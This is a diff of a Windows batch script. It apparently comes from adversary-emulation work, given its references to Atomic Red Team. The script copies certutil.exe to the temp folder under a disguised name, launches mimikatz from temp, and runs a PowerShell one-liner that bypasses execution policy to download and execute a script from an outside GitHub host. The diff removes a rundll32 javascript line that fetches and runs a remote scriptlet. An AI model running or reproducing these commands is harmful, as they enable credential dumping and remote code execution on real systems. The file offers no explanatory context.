@@ -1,8 +1,6 @@
 @echo on
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
 
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct}").Exec();
-
 start %temp%\mimikatz.exe
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
 
